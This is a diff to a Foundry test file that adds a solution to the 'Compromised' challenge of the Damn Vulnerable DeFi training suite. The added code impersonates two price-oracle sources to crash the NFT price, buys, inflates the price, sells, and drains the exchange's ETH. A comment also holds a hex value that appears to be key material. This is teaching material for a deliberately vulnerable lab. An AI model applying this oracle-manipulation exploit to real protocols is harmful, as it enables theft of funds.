@@ -2,7 +2,7 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console2} from "forge-std/Test.sol";
 import {VmSafe} from "forge-std/Vm.sol";
 
 import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
@@ -20,12 +20,13 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
+    // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
     uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
 
@@ -75,7 +76,45 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // Lower the price using two oracles
+        vm.startPrank(sources[0]);
+        oracle.postPrice("DVNFT", 0.001 ether);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice("DVNFT", 0.001 ether);
+        vm.stopPrank();
+
+        // Buy the NFT for 1 wei
+        vm.startPrank(player);
+        uint256 tokenId = exchange.buyOne{value: 0.001 ether}();
+        vm.stopPrank();
+
+        // Raise the price using two oracles
+        vm.startPrank(sources[0]);
+        oracle.postPrice("DVNFT", 999 ether + 0.001 ether);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice("DVNFT", 999 ether + 0.001 ether);
+        vm.stopPrank();
+
+        // Sell the NFT back to the exchange
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        // Send ETH to recovery
+        payable(recovery).transfer(999 ether);
+        vm.stopPrank();
+
+        // Reset back to original price
+        vm.startPrank(sources[0]);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.stopPrank();
     }
 
     /**
